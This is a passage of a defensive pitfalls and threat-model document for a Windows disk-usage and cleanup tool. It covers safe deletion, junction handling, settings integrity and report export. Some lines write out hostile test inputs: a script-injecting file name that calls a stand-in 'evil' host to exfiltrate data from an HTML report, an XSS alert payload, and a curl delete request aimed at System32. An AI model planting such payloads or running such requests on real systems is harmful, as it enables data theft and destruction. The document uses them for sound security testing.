| Use `MoveFileEx` with `MOVEFILE_REPLACE_EXISTING` for the Move feature without confirmation | Silently overwrites the destination file if a same-name file exists | Use `IFileOperation::MoveItem`, which shows the shell conflict dialog. Or explicitly check destination existence and prompt. |
| Persist sensitive paths (`C:\Users\<name>\AppData\Local\Slack\...\auth.db`) in `settings.json` snapshot history | Settings file becomes a sensitive-path inventory; can leak credentials' locations if disk is shared / synced | Document `%APPDATA%\FileTree` as containing path lists; mark `settings.json` as `FILE_ATTRIBUTE_HIDDEN`; do not store file contents, hashes, or owner info — only paths and aggregate sizes. |
| Drag-and-drop accept arbitrary OLE data without filtering | Dropped objects from email / browser can include shell-link payloads that execute on open | If implementing drop-target, accept only `CF_HDROP` (file list) format and validate each path as `PathFileExistsW` before adding to scan. Reject `CF_FILECONTENTS` and stream-format drops. |
| HTML report self-contained — runs JavaScript from arbitrary scanned filenames | A file named `<script>fetch('http://evil/')</script>.txt` embeds in the report and exfiltrates when the user opens it | HTML-escape every path on output. Default to `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'">` to block network fetches. |

---

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Confirmation dialog shows only "Delete 500 files (4.2 GB)?" with no paths | User can't tell *which* 500. Approves wrong batch. | Show count + total bytes + **top 10 largest paths verbatim** + scrollable "show all" link. Include drive and folder breakdown. |
| Single "Delete" button that both recycles and permanent-deletes (chosen via radio elsewhere) | Muscle-memory mistake; user clicks before noticing the toggle is set to permanent | Two distinct buttons: "Move to Recycle Bin" and "Delete Permanently…" — the latter with a distinct (red) color and ellipsis indicating extra dialog. Toggle the *default* only, never let the toggle silently change the meaning of one button. |
| Post-action summary disappears after 3 seconds | User who looked away misses the "47 errors" notice | Persistent summary panel (status bar or Errors tab) until manually dismissed; flash the errors badge. The existing Errors tab is the right surface. |
| Move-to feature accepts any destination, including under the source | Move `C:\Projects\Big` to `C:\Projects\Big\Archive` → recursive move into itself; potential data loss | Validate destination is not the source or a descendant of source before invoking `IFileOperation::MoveItem`. Show inline error before the operation. |
| "Undo last delete" claims it works for permanent-deleted files | Sets expectations that can't be met | Disable the Undo button if last batch was permanent. If recycled, the button opens the Recycle Bin Explorer view filtered to the deleted items (best `IFileOperation` can give us — there's no API to programmatically restore by undo record). |
| Search results show paths but no way to act on them | User finds 200 large old files, has no way to multi-select and delete from the search view | The search results panel needs the same selection + cleanup affordances as the main tree. Don't make users go back to the tree to find what they just searched for. |
| Snapshot compare uses cryptic terms like "delta," "churn," "drift" | Users don't know what the numbers mean | Use plain language: "Files grown," "Files shrunk," "New files," "Deleted files," "Net change: +1.2 GB" |
| Refresh after delete completely rebuilds the tree and resets scroll/expansion state | User loses context after every cleanup action | Preserve scroll position, expansion state, and (sanitized) selection across refresh. The selection is already complex (Pitfall 9); the tree expansion state is straightforward to round-trip via stable path identities. |
| Treemap visualization hides files smaller than ~3 pixels | User thinks the visualization shows everything; misses thousands of small files | Status badge "12,453 files below visualization threshold" with a click to drill in. |
| Keyboard shortcut for delete is `Del` with no modifier (per requirements POLISH-02) | A bumped Del key during navigation triggers the cleanup confirmation dialog at unexpected times | Confirm `Del` only after a selection exists; for permanent delete require `Shift+Del` (matches Explorer convention). |
| Drives picker in path bar (POLISH-01) shows all drives including BitLocker-locked / disconnected ones | User clicks, gets a cryptic Win32 error | Probe each drive's accessibility with `GetVolumeInformationW`; show locked drives greyed with a lock icon and disable selection. |

---

## "Looks Done But Isn't" Checklist

Things that appear complete but are missing critical pieces.

- [ ] **Recycle Bin delete:** Verify by deleting a small text file via the UI, then open Recycle Bin in Explorer and confirm the file is present with original name and path metadata. Network-drive and removable-drive paths should warn before permanent-delete.
- [ ] **Permanent delete confirmation:** The "Permanent delete" path requires an *additional* confirmation step beyond the standard recycle confirmation. Single-step permanent delete is unsafe even with a checkbox.
- [ ] **Junction handling:** Create a test directory with `mklink /J test C:\Windows`; scan its parent; verify the junction shows as a single node (not a recursive 30 GB Windows tree); delete the parent; verify `C:\Windows` is untouched.
- [ ] **Hardlink double-count test:** `mklink /H link.txt source.txt`; scan; verify size is reported once not twice when `hardlink_aware` is on; verify the duplicates tab understands the relationship.
- [ ] **Long path delete:** Create a path > 260 chars (`mkdir` a few `aaa...aaa` deep); attempt delete via UI; should succeed without `ERROR_PATH_NOT_FOUND`.
- [ ] **Scan-during-cleanup gating:** Start a scan; attempt to click Delete on a selection; verify button is disabled.
- [ ] **Selection survives refresh:** Select 5 items, trigger refresh, verify the same 5 items remain selected (resolved by stable identity, not vector index).
- [ ] **Re-stat before delete:** Modify a file on disk between scan and delete; attempt to delete; verify it's skipped with "changed since scan" in the summary rather than acted on blindly.
- [ ] **Atomic settings write:** Crash (taskkill) the app mid-settings-write; relaunch; verify settings load correctly and aren't truncated.
- [ ] **Single-instance guard:** Launch the app, then double-click the exe again; verify the second launch focuses the existing window rather than starting a second process.
- [ ] **Schema version on settings:** Manually edit `settings.json` to set `schema_version: 99`; launch; verify the app runs with defaults and does *not* overwrite the file.
- [ ] **Snapshot compare normalization:** Scan `c:\Projects` then `C:\Projects\` (mixed case + trailing slash); verify diff reports zero changes between identical snapshots.
- [ ] **Snapshot compare drive shift:** Save scan of `D:\foo`; rescan after remounting same content as `E:\foo`; verify diff is keyed on relative path and shows minimal noise.
- [ ] **Progress messages don't leak memory:** Run a 50k-item delete; check process memory before/after; verify no growth pattern indicating leaked `Box`'d LPARAMs.
- [ ] **Cancel during cleanup:** Start a 10k-item delete; click cancel; verify the operation stops within ~1 second and reports partial results (N of M completed).
- [ ] **HTML report XSS safety:** Add a file named `<script>alert(1)</script>.txt` to a test folder; scan; export HTML report; open in browser; verify no alert fires.
- [ ] **XLSX opens cleanly in Excel:** Test the .xlsx output in Excel 2019, Excel 365, and Excel Online. "Repaired" warnings = silent corruption.
- [ ] **Network-drive scan threading:** Scan a `\\server\share`; verify it uses ≤ 4 threads and warns about Recycle Bin behavior before cleanup.
- [ ] **Multi-select duplicate selection helpers (DUP-03):** "Keep newest" with a tie in `LastWriteTime` should pick deterministically (e.g., shortest path), not nondeterministically.
- [ ] **`/api/delete` is either removed or path-validated:** Verify with `curl http://127.0.0.1:7878/api/delete?path=C:\Windows\System32` returns 403 / 400 and does not act.

---

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Permanent delete of wrong files | HIGH (often unrecoverable) | Stop using the disk immediately. Run file-recovery tools (Recuva, PhotoRec) before the freed blocks get overwritten. SSDs with TRIM enabled are usually unrecoverable. Document this clearly to users before they enable Permanent Delete — half the recovery story is preventing the click. |
| Junction-redirect delete corrupted system files | HIGH | Restore from backup or System Restore. If neither exists: `sfc /scannow` may repair core system files; reinstall affected apps. Prevention is the only real strategy — see Pitfall 2. |
| Hardlink-aware scan reports wrong reclaim estimate | LOW | Re-scan with `hardlink_aware = true`; update the displayed estimate. No data loss. |
| `settings.json` corrupted (parse error) | LOW | App falls back to defaults; renames corrupt file to `settings.json.broken-<timestamp>`. User loses bookmarks and saved snapshots but no file data. Restore from `.bak` if rotation was enabled. |
| Snapshot history points to a path that no longer exists (drive removed) | LOW | UI marks the snapshot "source unavailable"; allow user to re-target to a new root (relative-path-keyed compare survives this). |
| Cleanup batch partially failed (sharing violation, ACL, etc.) | LOW | Post-action summary lists per-path errors. User retries after addressing each (close holding process, take ownership, etc.). |
| Multi-select state contains stale IDs after refresh | LOW (if Pitfall 9 prevention is in place) | Selection resolver drops missing identities, reports count to user, re-selects survivors. |
| TOCTOU caught by re-stat: file changed since scan | LOW | Skip + report in summary. User chooses to re-scan if they want to act on the new state. |
| Network-drive cleanup permanent-deleted because no Recycle Bin | MEDIUM | The pre-cleanup warning is the recovery — once deleted, only file recovery on the *server* side helps. Document the warning is non-bypassable. |
| Excel reports the XLSX as "needs repair" | MEDIUM | Re-export as CSV (always available as fallback). Investigate which OOXML element is malformed; common culprits are missing `xmlns` on `<worksheet>` or wrong `Content_Types.xml` MIME mappings. |

---

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| #1 Recycle Bin default | Cleanup phase | Delete-to-recycle test; code review for any `remove_*` calls; legacy `/api/delete` removed or gated |
| #2 Junction/symlink traversal | Scan + Cleanup phases (scan adds reparse_tag, cleanup respects it) | Junction-deletion test (Looks Done #3) |
| #3 TOCTOU wrong-path | Cleanup phase | Re-stat-before-delete unit test; gated cleanup-during-scan |
| #4 Long paths | Cleanup phase + manifest update in earliest phase that touches packaging | Long-path delete test (Looks Done #5) |
| #5 Hardlink double-count | Scan-engine phase | Hardlink test (Looks Done #4); free-space delta matches "bytes reclaimed" within tolerance |
| #6 Path normalization for snapshot | Snapshot phase | Case + trailing-slash + drive-shift tests (Looks Done #12, #13) |
| #7 Settings corruption | Settings persistence phase | Atomic-write crash test; single-instance test; schema-version test (Looks Done #9, #10, #11) |
| #8 UI thread blocking | Cleanup phase (template for all subsequent I/O features) | "Not Responding" doesn't appear during 50k-item delete; cancel test (Looks Done #15) |
| #9 Multi-select stale state | Multi-select phase (must co-launch with cleanup) | Selection-survives-refresh test (Looks Done #7) |
| #10 Antivirus / network drives | Search + Cleanup phases | Network-drive scan warning; throughput status; sharing-violation handling |

**Phase sequencing implication for the roadmapper:** The cleanup phase has hard upstream dependencies on scan-engine work (reparse-point tagging, hardlink awareness) and multi-select work. Settings persistence can land early as it's mostly independent. Snapshot compare depends on settings persistence (history list lives there) and path normalization (which is a scan-engine concern). XLSX/HTML exports are independent and can land last.

---

## Sources

- [SHFileOperationW function — Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shfileoperationw) — official confirmation that `SHFileOperation` permanently deletes without `FOF_ALLOWUNDO` (Pitfall 1)
- [SHFileOperationA function — Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shfileoperationa) — covers `fAnyOperationsAborted` cancellation check pitfall (Pitfall 1, Integration Gotchas)
- [File Operation Progress Sink samples — Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/shell/samples-fileoperationprogresssink) — `IFileOperationProgressSink` reference (Pitfall 8)
- [Using Messages and Message Queues — Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/winmsg/using-messages-and-message-queues) — `PostMessage` / `PostThreadMessage` semantics (Pitfall 8)
- [PostThreadMessageA function — Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-postthreadmessagea) — required `PeekMessage` to force queue creation (Pitfall 8)
- [RedirectionGuard: mitigating unsafe junction traversal in Windows — Microsoft MSRC, June 2025](https://www.microsoft.com/en-us/msrc/blog/2025/06/redirectionguard-mitigating-unsafe-junction-traversal-in-windows) — current authoritative source on junction-redirect attack class; 42 CVE statistic; threat model (Pitfall 2)
- [Notes on NTFS — TreeSize](https://manuals.jam-software.com/treesize/EN/notesonntfs.html) — vendor documentation on how a mature disk-usage tool handles hardlinks, ADS, compressed/sparse files (Pitfall 5, "Looks Done" #4)
- [Notes on NTFS — SpaceObServer](https://manuals.jam-software.com/spaceobserver/EN/notesonntfs.html) — corroborates TreeSize patterns; default-off hardlink detection rationale (Pitfall 5)
- [Hardlinks, Symlinks, and Junctions on Windows — hy2k.dev](https://hy2k.dev/en/blog/2025/11-23-windows-hardlink-symlink-junction/) — programmatic detection patterns (`WIN32_FIND_DATA.dwReserved0`, `FILE_FLAG_OPEN_REPARSE_POINT`) (Pitfall 2)
- [Junctions, Symbolic Links and Reparse Points — ntfs-3g wiki](https://github.com/tuxera/ntfs-3g/wiki/Junctions-Points,-Symbolic-Links-and-Reparse-Points) — cycle / DAG behavior caveats for recursive scanners (Pitfall 2)
- [NTFS sparse files](http://ntfs.com/ntfs-sparse.htm) — `AllocationSize` vs `EndOfFile` semantics (Pitfall 5 / scan correctness)
- [Correct disk space problems on NTFS volumes — Microsoft Learn](https://learn.microsoft.com/en-us/troubleshoot/windows-server/backup-and-storage/disk-space-problems-on-ntfs-volumes) — official guidance on NTFS allocation reporting (scan correctness)
- `.planning/PROJECT.md`, `.planning/codebase/ARCHITECTURE.md`, `.planning/codebase/CONCERNS.md` — brownfield context for which existing patterns are safe to reuse (esp. `WM_SCAN_DONE` template), which existing routes are dangerous (`/api/delete`, `/api/properties`), and which existing serializers can't be trusted with user-controlled content.

---
*Pitfalls research for: Windows native disk-usage explorer (FileTree) — milestone 2 (cleanup, search, snapshot, settings, viz, export)*
*Researched: 2026-05-22*
